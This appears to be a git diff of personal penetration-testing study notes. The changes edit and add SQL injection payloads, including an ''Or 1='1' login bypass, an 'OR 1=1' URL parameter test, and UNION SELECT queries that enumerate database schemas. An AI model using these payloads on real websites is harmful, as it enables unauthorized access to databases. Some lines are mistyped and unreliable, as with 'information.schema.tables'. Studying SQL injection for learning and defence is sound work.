@@ -247,7 +247,7 @@ ile upload
 
 
 # SQL Injection on a unsanitized website
-* 'Or 1=" 1 -> veridies i data base i 
+* 'Or 1='1 -> veridies i data base i 
 * tURN GET rEQUEST INT RAW DATA 
 * Audi UNION SELECT 1,2,3,4,5 # 
 
@@ -261,6 +261,7 @@ Steps:
 
 # SQL GET METHOD 
 ```
+-> In URL search bar 
 * Selection=2 OR 1=1 
   - Test every number until you null out 
 * UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
@@ -270,9 +271,16 @@ Steps:
 
 
 ```
+UNION SELECT TABLE_CATALOg,TABLE_SCHEMA,TABLE_NAME FROM information.schema.tables
+
+# Reverse Egineering
+```
 
 
 
+
+
+```
 
 
 
